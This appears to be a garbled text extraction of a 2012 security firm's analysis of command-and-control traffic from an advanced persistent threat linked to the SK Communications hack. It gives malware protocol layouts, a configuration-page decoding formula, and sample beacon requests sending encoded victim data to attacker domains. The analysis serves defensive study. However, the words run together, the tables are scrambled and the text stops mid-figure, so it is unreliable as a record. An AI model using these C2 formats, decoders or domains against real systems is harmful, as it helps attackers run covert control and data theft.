@@ -1,0 +1,3137 @@
+CommandandControlintheFifthDomain
+
+CommandFivePtyLtd
+February2012
+
+ABSTRACT
+
+This	paperpresentsthefindingsof	anextensiveinvestigationinto	
+commandandcontrolinfrastructureusedbyanAdvancedPersistent	
+Threat.	Findingsincludetechnicaldetailsof	malicioussoftware,	and
+associated	command	andcontrolprotocols.	Thesefindingsaredrawn
+upontoidentify	modusoperandi	and	demonstratelinksbetweena
+numberof	majortargeted	attacksincluding	therecentSykipot	attacks,
+theJuly	2011	SK	Communicationshack,	theMarch	2011	RSA	breach,	
+and	theseriesofcoordinated	cyberattacksdubbedNightDragon.
+
+Themalwareused	intheattackwasprogrammed
+to	communicatewithseveral‘callback’domains.The
+malwarelocateditsC2server(s)byresolvingthese
+domains into	IP	addresses using	the ubiquitous
+Domain Name System	 (DNS) 3protocol.	 These
+communicationsaredepicted	inFigure1.
+
+1.
+
+Computer
+infected with 
+
+malware
+
+2.
+
+3.
+4.
+
+WARNING
+
+BACKGROUND
+
+This	paperdiscussesmaliciousactivity	and	identifies
+InternetProtocol(IP)addresses,	domainnames,and
+websites that	may	contain malicious content. For
+safety	reasonstheselocationsshouldnot	beaccessed,
+scanned,probed,	orotherwiseinteracted	withunless
+theirtrustworthinesscanbeverified.
+On28	July	2011	SKCommunicationsannounced	it
+had	beenthesubjectof	ahackwhich	resulted	inthe
+theft	of	the personal details of	up	to	35 million
+people1.	The attackers infected a number of	SK	
+Communicationscomputerswith	malicioussoftware
+(malware)and,byissuingcommandand	control(C2)
+instructionstothemalware,wereableto	gainaccess
+to,	and	exfiltratelargequantitiesof	data.	Theattack
+itself	wascomplex,	wellplannedandlikely	partofa
+broader,concertedhackingeffortattributableto	an
+Advanced	Persistent	Threat2.
+																																																																			
+1Fordetails	ofthehack	refertotheCommand	Fivepaper‘SK	Hack
+byanAdvanced	PersistentThreat’.(Command	FivePtyLtd,2011)
+2Foradefinitionoftheterm‘Advanced	PersistentThreat’	referto
+theCommandFivepaper‘Advanced	PersistentThreats:ADecade
+inReview’.(CommandFivePtyLtd,2011)
+
+DNS server
+
+Command and 
+control (C2) server
+
+2.
+
+3.
+
+4.
+
+1. Using the Domain  Name System (DNS) protocol, the computer
+
+asks a DNS server for directions to the callback domain. 
+The DNS server advises that the callback domain is located at IP
+address x.x.x.x.
+The malware communicates with the C2 server located at IP
+address x.x.x.x to obtain C2 instructions and/or to send a
+response.
+The C2 server provides additional C2 instructions to the malware.
+
+FIGURE1:DEPICTIONOFCOMMUNICATIONS
+																																																																			
+3DNSis	fundamental	ontheInternet.Itisaformofdirectory
+assistancetohelpcomputers	communicatewith	othercomputers.
+Itsuseisanalogoustoapersoncalling	directoryassistancetofind
+outwhatphonenumbertodial	tospeak	toacertainperson.
+
+COPYRIGHT©	COMMANDFIVEPTY	LTD.ALLRIGHTSRESERVED.
+
+PAGE1OF	29
+
+THE VICTIMS
+
+into	
+
+intrusion
+
+subdomains
+
+Oneof	thecallbacklocationsused	intheSK
+Communications hack was ‘update.alyac.org’.	The
+domainwasregistered	on24	September2010	using
+registrationinformationalmost	identicalto	that	of	a
+legitimatecompany	–atacticused	by	theattackeron
+severaloccasions4.	
+Following	
+the
+SK
+the
+Communicationsnetworkit	becamewidely	known
+that	the domain was being used for malicious
+purposes,	andperhaps	forthisreason,	theoneyear
+registrationwasnotrenewed	by	theattacker.	Despite
+this,	anumberof	victims	aroundtheworld	continued
+to	usethedomainto	locatetheirC2	server,	resulting
+inattempted	communicationsto	aC2	serverthat	no
+longerexists.
+Computersusing	IP	addressesallocated	to	France,	
+thePeople’sRepublicof	China,	Portugal,	SouthKorea,
+Taiwan,	theUnited	Kingdom	and	theUnited	States
+areamong	thosethat	attempted	to	communicatewith
+‘alyac.org’
+attacker’s
+after
+the
+registrationlapsedinSeptember2011.
+While some of	 these computers belong	 to
+security	 researchers who deliberately	
+installed
+malware for research	purposes,	most	are victims
+compromised	by	the attacker either directly	or
+indirectly.	 The victims	 are from	 a variety of
+industries including	the technology	sector,	high	
+precisionmanufacturing,	research	and	development,
+testing	and certification,	global market research,
+headhunting	
+executive
+and	 mentoring,	
+and
+webhosting	providers.
+Eight	different	types of C2	communications were
+from the
+subdomains
+to ‘alyac.org’
+observed	
+compromised	 computers. These
+communication
+typeswillbereferredtoas‘LURK’,
+‘X­ShellC601’,	
+‘Update?’,
+‘DB’,	and	‘Qdigit’
+‘BB’,
+‘Murcy’,	‘Oscar’,
+respectively.	Severalvictimscommunicatedviaboth	
+‘Update?’ and	
+‘Oscar’ which	are believed	to	be
+associated	with	thesamemalware.	Noothervictims	
+were observed	 communicating	 with	
+‘alyac.org’
+subdomainsviamorethanoneC2	protocol.
+																																																																			
+4Other domains	 registered	 using	 a similar
+tactic include
+‘nprotects.org’, and ‘trendmicros.net’. (Command
+‘bomuls.com’,
+FivePtyLtd,2011)
+
+THE COMMUNICATIONS
+
+THE ‘LURK’ COMMUNICATIONS
+
+Asinglecomputerwasobserved	communicating	with
+thecallbackdomain‘path.alyac.org’onTransmission
+ControlProtocol(TCP)80viathe‘LURK’protocol.
+The communications contained a 15­byte header
+followedbydatacompressed	usingtheDEFLATE5
+compression method.	 The header
+contained a	
+protocolidentifier,sizeand	compressioninformation
+asshowninTable1.
+BYTE	
+DESCRIPTION*
+SIZE	(BYTES)
+POSITION
+4
+0
+LURK	protocol	identifier.
+Hexadecimalbytes	‘0x4C	0x550x52
+0x4B’	(or“LURK”inASCII
+representation).
+1
+4
+Hexadecimalbyte‘0x30’(“0”)inall
+observedsamples.Bytemayform
+partoftheprotocol	identifier.
+4
+5
+Sizec­Compressedmessagesizein
+bytes	(includingheader).
+Decompressed	datasizeinbytes.
+4
+9
+ZLIB6streamheader.Hexadecimal
+13
+2
+bytes	‘0x780x9c’7inallobserved	
+communications,denoting	thatthe
+DEFLATEcompressionmethod	was
+used	tocompressthedata(witha
+window	sizeof32K).
+[Sizec–15]
+15
+DEFLATEcompressed	data.
+*ALL	VALUES	ARE	LITTLE­ENDIAN	UNLESS	OTHERWISE	STATED.
+TABLE1:LURKPROTOCOLFORMAT
+The decompressed	 data reveals information
+about	thecompromisedcomputersuch	asits	name,	
+computerspecificationsand	operating	system	(OS)
+informationasshowninTable2.	Forexample,it
+compromised	
+reveals
+computer
+the
+communicating	 with	
+is	 running	
+‘path.alyac.org’
+Windows2003ServerWebEdition,	ServicePack2.
+																																																																			
+5TheDEFLATEcompressionmethod	is	specified	inRFC1951.
+(Deutsch,1996)
+6ZLIBisacompresseddataformatschemespecified	inRFC1950.
+(Deutsch,ZLIB	CompressedDataFormatSpecificationversion3.3,
+1996)
+7As	described	inSection2.2	ofRFC1950,bits	0	to3	inthefirst
+byteoftheZLIB	streamheaderrepresentthecompressionmethod
+used,and	bits	4	to8representcompressioninformation.The
+second	byteintheheadercontains	bitsforanintegritycheck,
+along	with	twoadditional	flags.With	asecond	byteof‘9c’	the
+integritycheck	passes	(as30876	is	divisible	by31),thepreset
+dictionaryflagisnotset,andthecompressionlevel	flag	indicates
+thatthedefaultalgorithmwasused	forcompression.(Deutsch,
+ZLIB	Compressed	DataFormatSpecificationversion3.3,	1996)
+
+that	
+
+COPYRIGHT©	COMMANDFIVEPTY	LTD.ALLRIGHTSRESERVED.
+
+PAGE2OF	29
+
+OF
+
+DESCRIPTION*
+BYTE	
+SIZE	
+(BYTES)
+POSITION
+Possibleprotocolidentifier.Fixed	bytes	‘0x82
+0
+4
+0x690x740x6B’	inallobserved	
+communications.
+‘0x00’	bytes	inallobserved	communications.
+4
+260
+‘0xD0’	inallobserved	communications.
+264
+1
+Null­terminated	computername.
+265
+31
+‘0x00’	bytes	inallobserved	communications.
+296
+24
+OSVERSIONINFOEX8structure(formatshown
+320
+156
+inAnnexA).
+Null­terminated	accountname.
+476
+9
+Unknown.
+485
+19
+Horizontal	screenresolution(pixels).
+504
+4
+Vertical	screenresolution(pixels).
+508
+4
+Unknown.
+512
+92
+ComputerProcessorUnitspeed	inmegahertz
+604
+4
+(MHz).
+Null­terminated	string	containing	amountof
+608
+8
+memoryand	unitofmeasurement(e.g.
+“1023MB”).
+616
+Unknown.
+120
+*ALL	VALUES	ARE	LITTLE­ENDIAN	UNLESS	OTHERWISE	STATED.
+FORMAT
+LURK
+TABLE
+DECODED
+2:
+COMMUNICATIONS
+communications9are known to be
+Similar
+generated	by	malwarethatcommunicateswith	the
+a	
+–
+callback domain ‘office.windowupdate.org’
+domainthat	is	linked	to	‘alyac.org’notonly	by	the
+communicationsprotocolbut	also	by	both	domain
+registrationtacticand	infrastructure.
+The domain ‘windowupdate.org’
+is	ostensibly	
+registered
+Corporation’.
+The
+administrativeaddressand	contact	informationlisted
+inthedomainregistrationis	identicalto	that	listed
+Microsoft
+the
+for
+domain
+‘windowsupdate.com’10.	Thisis	thesametacticused
+by	theattackerwith	registrationof	‘alyac.org’11.
+																																																																			
+8TheOSVERSIONINFOEXsysteminformationstructureincludes
+major and	minor version numbers, a build number, platform
+identifierand	informationaboutproductsuites	and	thelatest
+ServicePackinstalled.(MicrosoftCorporation,2011)
+9Themalware‘Troj/Agent­UDR’	with	MD5	hash‘42377E724875
+2912 5EBE 7C95 02B9	 4CD7’	
+generate
+is	 known to
+communications
+‘LURK0\xAC\x01’,
+format
+of
+the
+‘LURK0\B3\x01’	
+’LURK0\xAD\x01’,
+‘LURK0\xB5\x01’.
+and	
+(Sophos	Ltd.,2011)
+10The legitimate domain ‘windowsupdate.com’	
+is	 used	 by
+Microsofttodeliverupdates	totheWindowsOS.
+11Thedomain‘alyac.org’was	registeredusing	registrationdetails
+thatmade	thedomainappearas	though	itwas	associated	with	the
+legitimate,trusted	entityESTsoft–theproducerofALYacantivirus
+software.(Command	FivePtyLtd,	2011)
+
+to	
+‘Microsoft	
+legitimate
+
+the
+
+The domain ‘windowupdate.org’ previously	
+pointedtoSouth	KoreanIP	address222.122.20.241­
+anIPaddresstowhich	‘alyac.org’also	previously	
+pointed.This	shared	infrastructurefurthersuggests
+that	theobservedcommunicationsto	‘path.alyac.org’
+and	thoseto	‘office.windowupdate.org’may	belinked
+to	thesameattacker.
+The malware
+LURK	
+that	 generates
+‘office.windowupdate.org’
+communications sent	to	
+was signed using	a compromised code signing
+certificatebelongingto	YNKJapanInc	–aproducerof	
+onlinegames.	Thesamecertificatehasbeenused	ina
+numberofattacksincluding	by	Hupigonmalware12
+and	 malware similar
+to that	 used in the SK
+Communicationshack.	Detailsof	thecompromised
+code signing	certificate are shown in Figure 2.
+(Fagerland,	2011)
+SerialNumber:
+046931BF57EBC5947D3DC4EE7A236E
+YNKJAPANInc
+CommonName:
+Revoked
+Status:
+Nov27,2009–Nov272011
+Validity(GMT):	
+DigitalID	Class3–SoftwareValidation
+Class:
+YNKJAPANInc
+Organisation:
+DigitalID	Class3–Microsoft	Software
+Organisational
+Unit:
+Validationv2
+State:
+Chuo­ku
+City/Location:
+NihonbashiKodenmachou10­6
+JP
+Country:
+SerialNumber:
+6724340ddbc7252f7fb714b812a5c04d
+IssuerDigest:
+96c16fb10ef41f9736c50c5bac0ddd67
+FIGURE2:COMPROMISEDCERTIFICATEDETAILS
+Thecompromised	codesigningcertificatewas
+revoked	on29	July	2011	but,	asthemalwarewas
+signed	on3	July	2010	andtherevocationwasnot
+activeforsoftwaresignedbefore29July	201113,	the
+certificate continued to	validate for this malware
+aftertherevocation.	(Fagerland,	2011)
+Thedateof	effectoftherevocationhassince
+beenbackdatedtoprevent	thismalware’scertificate
+fromvalidating14.	Thenewdateofeffectstillmay	not
+prevent	the validation of all malware using	this	
+compromised	codesigning	certificate.
+																																																																			
+12Hupigonis	aremoteadministrationtoolfromChina.Ithas
+rootkit
+functionality, can log user activity and	 establishes
+outbound	communications	toaC2	server.(F­SecureCorporation)
+13Therevocationisactivefromthe‘revocationDate’(inthis	case,
+29July2011)specified	intheCertificateRevocationList.
+14Therevocationforthecompromised	codesigningcertificatehas
+beenbackdated	to 12	April	2010	so thattheearliest known
+malwaresigned	with	itnolongervalidates.(Verisign,2011)
+
+COPYRIGHT©	COMMANDFIVEPTY	LTD.ALLRIGHTSRESERVED.
+
+PAGE3OF	29
+
+THE ‘X­SHELL	C601’ COMMUNICATIONS
+
+Numerous compromised	computerscommunicated
+with ‘path.alyac.org’ on TCP	 port 443 ­a port
+commonly	used	for SSL. These communications,
+however,	were not	SSL but	instead	unencrypted	
+communicationslikely	generated	by	aversionof	the
+601’
+‘X­Shell
+command­line
+Remote
+based
+AdministrationTool(RAT)15.	
+X­Shell
+observed	
+the
+of	
+summary	
+A
+communications,	and	the information they reveal
+about	thecompromised	computer,	is	showninTable
+3.	The‘C’immediately	preceding	the‘601’inthe
+communications is believed	to indicate that	the
+malwareis	not	afreeversionbut	instead	acustom,	or
+commercial,	versionof	theX­Shell601	RAT.
+DESCRIPTION*
+BYTE	
+POSITION
+‘0x00’	bytes	inallobserved	samples.
+0
+Tick	count(numberofmilliseconds	
+8
+sincesystemwas	started	–resets	after
+49.7	days).
+12
+‘0x00’	bytes	inallobserved	samples.
+Protocolidentifier–’0x430x360x30	
+16
+0x31’	(“C601”).
+Null­terminated	username(if
+20
+successfullyobtainedfromthesystem).
+OSVERSIONINFOEXstructure(format
+48
+showninAnnexA).
+Unknown.
+204
+256
+Null­terminated	computername(if
+successfullyobtainedfromthesystem).
+288
+Processname.
+300
+‘0x00’	bytes	inallobserved	
+communications.
+SYSTEM_INFO16structure(format
+352
+showninAnnexB).
+388
+‘0x00’	bytes	inallobserved	samples.
+460
+Unknown.
+Localeidentifier17.
+472
+Tick	count(repeated).
+476
+480
+Unknown.Mainly’0x00’bytes	in
+observedcommunications.
+*ALL	VALUES	ARELITTLE­ENDIAN	UNLESS	OTHERWISE	STATED.
+TABLE3:X­SHELLC601COMMUNICATIONFORMAT
+																																																																			
+15TheX­ShellRATis	commercial	software.(XTiger,Xdoors.net,
+2011)
+16The SYSTEM_INFO structure contains information about a
+computersuch	as	its	architecture,typeofprocessorand	numberof
+processors	used.(MicrosoftCorporation,2011)
+17A locale is a collection of language­related user preference
+informationthattypicallyidentifies	auser’s	countryand	dialect.
+(MicrosoftCorporation,2011)
+
+In	all observed	communications the process
+namelistedat	byte288was‘svchost.exe’18.	Based	on
+this,	the malware has likely	modified the system
+registry	onthecompromised	computersinsuch	a
+way	that	theRAT	getsexecutedasaserviceby	the
+trusted	process‘svchost.exe’each	timethecomputer
+is	started.	This	processname,	along	withthecallback
+location,	is	configurable,	and	canbeconfigured	after
+theRAThasbeencompiled	into	executableform.
+WhileX­Shellsupportsnumerousversionsofthe
+WindowsOS(includingWindowsXP,	Vista,	Windows
+7,	and	Windows	2000,2003	and	2008	server­both
+32	and	64	bit	versions),	only	computersrunning
+Windows XP were observed	communicating	with
+‘path.alyac.org’.
+The functionality of the RAT	depends	on the
+version,	releasenumber,	pluginsinstalled	and	theOS
+onwhich	theRAT	isinstalled19.	Severalversionsof
+theX­ShellRAT	exist,	includingafreeversionand	a	
+‘spy’version20.	ThefreeversionoftheRAT	is	no
+longer available for download	from	the XDoors
+website,	however,	development	 of	the software
+continues21.	Current	releasenumbersof	theX­Shell
+RAT	include601	and	603.Previousreleasesdate
+backto	at	least	200622.	
+in all
+Some
+versionsof	theRATincluding	theabilityto	start	a
+command	 shell,	 control processes and services,
+upload/download	files,	terminateTCP	connections,
+createuseraccounts,	retrievesystem	information,	log	
+useractivity(viaakeylogger),	modifytimestamps	on
+files,	conduct process injection, conduct denial of
+service attacks and shutdown or
+the
+restart
+computer.	 Commands	 supported	 by	 the X­Shell
+softwarearelisted	inAnnexC.	(XTiger)
+																																																																			
+18Theprocess	‘svchost.exe’	isagenerichostprocessforservices
+which	runfromDLLs.(Microsoft,AdescriptionofSvchost.exein
+WindowsXP	ProfessionalEdition2007)
+19Notallfeatures	aresupported	ineach	OS.Forexample,raw
+socketsniffingis	onlysupportedinWindows2000and2003.
+(XTiger)
+20Versions	ofX­Shellincludea‘personal’edition,a‘mini’version,
+an‘advanced’	version,a‘spy’versionand	an‘enterprise’version.
+(XTiger­Crackersoftware,2011)
+21Duetotheauthorwantingtoavoid	“unnecessarytrouble”,asof
+16March2011,thefreeversionoftheX­ShellRAT(and	alsoits
+sisterproducttheX­DoorRAT)is	nolongeravailable	fordownload
+from the ‘xdoors.net’	 webpage, however, an online forum
+containing	alistofchanges	madetotheRATcontinues	tobe
+updated. (XTiger,
+forum.xdoors.net. Topic: X­Door/X­Shell
+free
+download	paused,2011)
+22Previousreleases	ofX­Shellinclude	releasenumbers323,325,
+327,	329,331,333,335	and	337.(XTiger,2010)
+COPYRIGHT©	COMMANDFIVEPTY	LTD.ALLRIGHTSRESERVED.
+
+SIZE	
+(BYTES)
+8
+4
+4
+4
+28
+156
+52
+32
+12
+52
+36
+72
+12
+4
+4
+300
+
+functionality	 comes
+
+standard	
+
+PAGE4OF	29
+
+its
+
+specify
+
+connection
+
+TheRATis	VirtualMachine(VM)aware,	proxy	
+awareand	canalso	useaspecified	DNS	serverto
+resolvecallbackdomains.	Someversionshaverootkit
+functionality	and	canavoid	detectionbyantivirus
+software.	Third­party	pluginscanbedeveloped	and
+integrated	intotheproduct.
+Optionalfeaturesincludeencryptedfilesearch,
+anSMS	notificationservice,	and	functionality	that	
+enablesthecompromisedcomputertobeusedas
+part	of	a botnet	to	send	spam	or to	conduct
+distributeddenialof	serviceattacks.	This	broadrange
+of	functionality	makesthesoftwarefitforanumber
+of	purposesand	reflectsthecommercialnatureofthe
+software.	(XTiger)
+The X­Shell RAT is generated by the X­Shell
+ControlProgram	­thesameprogramfromwhich	the
+malwareis	controlled.Thecontrolprogram	canbe
+run in either Chinese language mode or English
+languagemode,	andallowsthemalwaretobeeasily	
+configured.	It	providesoptionstodigitally	signthe
+malware,
+mode	
+(connect/listen/sniff),	installthemalwareinoneof	
+severalcovertmanners,	recovertheSystem	Service
+Dispatch	Table(SSDT)23beforeinstallation,	and	abort
+installationifavirtualmachineis	detected.(XTiger)
+When X­Shell malware is generated,	and	the
+‘connect’connectionmode24selected,	themalwareis	
+configured with	a static C2	host	(IP	address or
+callbackdomain)and	controlport.	Additionally,	an
+optioncanbeselectedduring	thegenerationprocess
+to	actively	notifythemalwareof	anew	C2host	and
+portviaaconfigurationwebpage25.	If	thisoptionis
+selected,	the malware communicates with both	a
+configurationwebpage,and	aC2serverat	regular
+intervals.	Theintervalforeach	canbeseparately	
+configured to a value of between 30 and 3600
+seconds	(inclusive).	(XTiger)
+TheX­ShellRATs	that	communicated	with	theC2
+host	‘path.alyac.org’hadbeenconfiguredtousea36
+second	interval.	It	is	not	knownwhetherthemalware
+was configured	solely	with	a static C2	host	or
+																																																																			
+23The SSDT is	often used	by kernel	mode	rootkits	to evade
+detection.
+24Inthe‘connect’	mode	themalwareattempts	tocommunicate
+withits	C2	server,asopposedtothe‘listen’	modeinwhichitwaits
+foraC2	servertoattempttoconnecttoit.
+25Theconfigurationwebpageis	oftennamed	‘xcip.asp’	and	canbe
+generated	and	uploaded	fromwithinthecontrol	program.‘Xcip’	is
+presumably	an acronym for ‘X­door Configure IP	address’	or
+something	similar.
+
+X­Shell Configuration Webpages
+
+whetherthemalwarealso	retrievesits	C2hostand
+portfrom	aconfigurationwebpage.
+X­Shellconfigurationwebpagescontain,inencoded	
+form, a colon­separated	IP	address (or callback
+domain) and port	 for the malware to use to
+communicate with	its C2	server. The encoded IP
+address(orcallbackdomain)and	controlport	canbe
+decoded	onebyteat	atimeusing	theformula:
+di=	ei–((i%8)+x),
+wherei	is	thebyteindex,	di	is	thedecoded	byte,	eiis	
+theencoded	byteand	x	isaonebytekey.Thisis	the
+equivalent	of	subtracting	both	thekey	and	thebyte
+positionnumber[0­7]	fromeach	byte.	Theposition
+numberis	modulo	8i.e.	repeatsevery	8bytes.	
+For example,	if	the compromised	computers
+received	a C2	host	of	
+‘PATH.ALYAC.ORG’ and	a
+controlport	of	443	from	aconfigurationwebpage,
+and	akey	of	0x16	(22	indecimal)wasused	to	encode
+thecontrolinformation,	theconfigurationwebpage
+string
+encoded
+the
+contained
+would	 have
+‘fXlaH\hvWZFhlbVQJJ’.	
+HyperText	TransferProtocol(HTTP)	POST	‘Update?’
+‘path.alyac.org’ and	
+requests were sent	to both	
+‘update.alyac.org’
+from	 compromised	 computers.	
+Two request	formats were observed; Variant	A
+(showninFigure3)inwhich	thefilepath	requested	
+was
+‘/update?product=windows’, and	 Variant B
+(showninFigure4)inwhich	thefilepath	requested	
+was‘/update?id=number’,	where number	refersto	an
+eight	 digit hexadecimal number
+that	 changes
+betweenrequests.	Thedomain‘path.alyac.org’only
+received	Variant	Brequests,	whilebothvariantswere
+sentto	‘update.alyac.org’.
+
+THE ‘UPDATE?’ COMMUNICATIONS
+
+COPYRIGHT©	COMMANDFIVEPTY	LTD.ALLRIGHTSRESERVED.
+
+PAGE5OF	29
+
+POST /update?product=windows HTTP/1.1
+Accept: */*
+X-Session: 0
+X-Status: 0
+X-Size: 61456
+X-Sn: 1
+User-Agent: Mozilla/4.0 (compatible; MSIE
+6.0; Windows NT 5.1;SV1;
+Host: update.alyac.org
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+Cookie: VisitorID=c2a4b456-e11e-4c37-88d8-
+e770aa88058d&Exp=9/25/2014 6:14:17 AM
+
+FIGURE3:VARIANTACOMMUNICATIONS
+
+�
+�
+�
+
+to	
+
+from	
+
+TheDestoryRATfamily	includesmalwarethatis
+detected	as:
+Backdoor.Sogu,
+Backdoor:Win32/Thoper.A29,
+Trojan.Downloader:Win32/ThoperB30.
+Theobserved	communicationstothe‘alyac.org’
+subdomainsalloccurredonTCPport80,however,a
+variety	of	ports(TCP	ports8080,	443,	12345	etc.)	
+havebeenused	bythisparticularfamily	ofmalware
+forsimilarrequests.	Theport	useddependsonhow
+themalwareis	configured.
+the
+each	 of	
+attempts
+Connection
+compromised	computersoccurredfrequentlywhile
+thecomputerswerepowered	on.	Forexample,	one
+computer connected at 16	second intervals and
+another approximately	every 200 seconds	(±15	
+seconds).	ThreeHTTP	POST	requestsweresubmitted	
+during	each	connection, each	approximately	one
+secondapart.	
+Thefollowingmalformeduser­agent31is	present	
+intheHTTP	POST	requestsof	both	variants(spaces
+shownhereas‘·’):
+‘Mozilla/4.0·(compatible;·MSIE·6.0;·Windows·NT
+·5.1;SV1;’
+This	user­agent	is	consistent with that	which	
+may	begeneratedby	version6.0oftheMicrosoft
+Internet Explorer web browser running on the
+Microsoft	Windows	XP	OS,	except	that	it	is	missing	a
+closing	bracket	afterthelast	semicolonandaspace
+afterthesecondtolast	semicolon.Thismalformed	
+user­agent	is	hardcoded	into	themalwareand	canbe
+used	asasignaturetodetect	thecommunications.
+Four custom headers are also	present in the
+HTTPrequests:	‘X­Session’,	‘X­Status’,	‘X­Size’,	and‘X­
+Sn’.ForsomemalwareintheDestory	RATfamily	not
+allof	theseheaderswillbepresent.
+																																																																			
+29TheDestoryRATwith	MD5	hash‘5FCE1FC1	8283D76C	396A
+3CCC 64BD BBDE’	is detected by antivirus software as both
+Backdoor.Soguand	Backdoor:Win32/Thoper.A.This	malicious	file
+is	identical	tothatused	intheSK	Communications	hack	exceptfor
+itsconfiguration.(HispasecSistemas,2011)
+30TheDestoryRATwith	MD5	hash‘754364D9	DB702DC71532
+7B40 BF97 E556’	is detected	by antivirus	software as both
+and	
+Backdoor.Sogu
+TrojanDownloader:Win32/Thoper.B.
+(HispasecSistemas,2011)
+31User­agents	 are used in HTTP	 communications
+to tell
+webserverswhich	OSand	webbrowsertheirclients	areusing,so
+theycanservecompatiblewebpages.
+COPYRIGHT©	COMMANDFIVEPTY	LTD.ALLRIGHTSRESERVED.
+
+PAGE6OF	29
+
+POST /update?id=3109c2a2 HTTP/1.1
+Accept: */*
+X-Session: 0
+X-Status: 0
+X-Size: 61456
+X-Sn: 1
+User-Agent: Mozilla/4.0 (compatible; MSIE
+6.0; Windows NT 5.1;SV1;
+Host: path.alyac.org
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+Cookie: VisitorID=bd5ab197-355d-42cb-ae1b-
+8d23f1dd55ed&Exp=9/25/2014 6:03:33 AM
+
+FIGURE4:VARIANTBCOMMUNICATIONS
+The format	of	Variant A is	identical to the
+communicationsgenerated	by	theDestoryRAT	used
+in the SK Communications hack26.	The format	of	
+Variant	 B is	
+the communications
+identical
+generated	by	malwarethat	usesthecallbackdomain
+‘gm1.network­sec.net’27.	
+Both	variantsareassociatedwiththeDestory
+RAT	familyofmalwarethatdatesbackatleastasfar
+asJanuary	200728and	hasbeenusedinseveralmajor
+targetedattacks.
+																																																																			
+26Foradetailed	analysis	oftheDestoryRATused	intheSK
+Communicationshack	(including	acompletelistofdeobfuscated
+strings)refertotheCommandFivepaper‘SKHack	byanAdvanced
+PersistentThreat’.(Command	FivePtyLtd,2011)
+27Malware detected as ‘Troj_Inject.AMR’ submits HTTP	POST
+requests	to‘gm1.network­sec.net/update?id={value}’.Thedomain
+‘gm1.network­sec.net’is	aknowncallbackofmalwaredetectedas
+Backdoor:Win32/Thoper.A.(Mendoza,2011)(Wong,2011)
+28TheDestoryRATwith	MD5	hash‘70CDC9A2	D9CC276B	C5D1
+D47D21FB	24DF‘	wascompiled	on3	January2007.
+
+Cookie	Stealing
+
+CookiesweresentwiththeHTTPPOSTrequestsfrom
+allbut	threeIPaddresses.Acookienamed‘VistorID’
+waspresent	any	timeacookiewassent.	Onoccasion
+a‘Yahoo’,	‘SessionId’and/or‘fcVal’cookiewasalso	
+present	intherequests.Thetransmissionofthese
+cookiescould	facilitatesessionstealingand,inthe
+case of	 the Yahoo cookie,	 enable unauthorised
+webmailaccess.
+Each	VisitorID	cookiecontainedanexpiry	time
+between 9/25/2014 5:50:03	AM and	9/25/2014
+6:14:17	AM.	Theexpiry	timeis	uniqueforeach	victim
+and	remainedconstant(pervictim)	acrosstheHTTP
+POST	requests.	Itis	possiblethevictims	received	the
+cookie from	a C2 server with which	they	had
+previously	communicated,	or,	from	aserverhosting	a
+webpagethatcaused	theinitialinfection.Itis	also	
+possiblethat	thecookie,and	thepropinquity	of	the
+timesinthecookies,	iscoincidental,	andthat	the
+victims	receivedthecookiefrom	otherlocations.
+Multiple Chinese IP	 addresses were observed
+submitting HTTP GET	
+to the host
+requests
+‘path.alyac.org’.	 Data
+contained	 within
+the
+communicationsindicated	that	therequestswereall
+sent	from	a single computer,	and	therefore that
+computerwasnot	using	astaticIP	address.
+Thedatafrom	thecomputerwascarriedinthe
+requestsinanencoded	form	(asdescribed	below)
+withinaHTTPheadernamed	‘Extra­Data’.	Two	other
+uniqueheaderswerealso	present	intherequests;
+The
+‘Extra­Data­Space’.
+and
+‘Extra­Data­Bind’
+communicationsappearto	begeneratedbymalware
+knownas‘Backdoor.Murcy’that	is	reportedly	not	in
+widespread	use32.	Anexampleof	anactualHTTP	GET
+requestis	showninFigure5.	
+
+THE ‘MURCY’ COMMUNICATIONS
+
+GET /150828 HTTP/1.0
+Connection: Keep-Alive
+Accept: */*
+Host: path.alyac.org
+User-Agent: Mozilla/4.0 (compatible; MSIE
+6.0; Windows NT 5.1)
+Extra-Data-Bind: DE6A34D80D43B930
+Extra-Data-Space: 65536
+Extra-Data:
+4ZFNSAAEAAh2AoNAAAAAAgRCHACwoSogAjKhCCf/HA
+AVNAAAAeAAAgDBAAABIAAAs0kAAUAAAAQAAAAAooAA
+AIAAAAATAAAAKCAAAgKAAAgqAAAA4CAAAgNAAAAOAM
+DA3AgQAxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+xxxxAEEAzAQOAADA5AAMAkDAwAgNAkDAxAAAAMFAlB
+gcAYHApBwYAUGAgAAUAEGAjBwaAACAzAAAAAAATBQW
+AMFAUBQRA0EAAAwVA8EAXBQLAUEA4AQRAxxxxxxxxx
+xxxxxxxxxx2AAAAAAA
+Cache-Control: no-cache
+Pragma: no-cache
+Content-Length: 0
+
+FIGURE5:SAMPLEOFMURCYCOMMUNICATIONS
+The path	in the HTTP GET	requests is	the
+computer’stickcount(i.e.thenumberofmilliseconds	
+sincethesystemwasstarted).	Therequestsfrom	the
+victim	occurred	approximately	every	11 seconds
+whenthecomputerwasturned	on.	Accordingly,	the
+numberintheURI	increasedbyapproximately	11000
+each	request. Where there was a break in the
+communications(presumably	dueto	thecomputer
+being	shut	downorrebooted),	thecounterreset	and
+was between 128703	and	133243	in the next
+communication. This indicates that
+the malware
+began communicating	
+compromised	
+this
+computer within minutes of	the computer being
+booted.Theencoded	datawithinthe‘Extra­Data’header
+canbedecoded	using	thestandard	Base64alphabet
+but	with	modified	bit	placement.	The standard	
+Base64	algorithm	decodes encoded	strings using
+consecutivebitsread	left	toright	i.e.	bits0­7	would
+formthefirst	decodedbyte(showninFigure6).For
+Murcycommunications,	theinputbits	that	formeach	
+output	byte are not	taken contiguously.	Figure 7
+describes how	the first	three decoded	bytes are
+constructed,	 and	 can be used to implement	 a
+decoding	algorithm.
+
+from	
+
+																																																																			
+32SymantecCorporationassessesthenumberofBackdoor.Murcy
+infections	tobelessthan50.(Ward,2011)
+
+COPYRIGHT©	COMMANDFIVEPTY	LTD.ALLRIGHTSRESERVED.
+
+PAGE7OF	29
+
+8
+
+9
+
+5
+9
+13
+
+1stBase64encodedcharacter 2ndBase64encodedcharacter
+0
+11
+7
+6
+5
+4
+3
+2
+10
+1
+1stdecodedbyte
+2nd
+3rdBase64encodedcharacter
+4thBase64encodedcharacter
+14
+18
+22
+17
+16
+15
+12
+13
+19
+20
+21
+23
+decodedbyte
+3rddecodedbyte
+FIGURE6:BITPLACEMENTINBASE64DECODING
+1st decoded
+4
+10
+2
+1
+0
+11
+3
+byte2nd decoded
+8
+14
+15
+16
+17
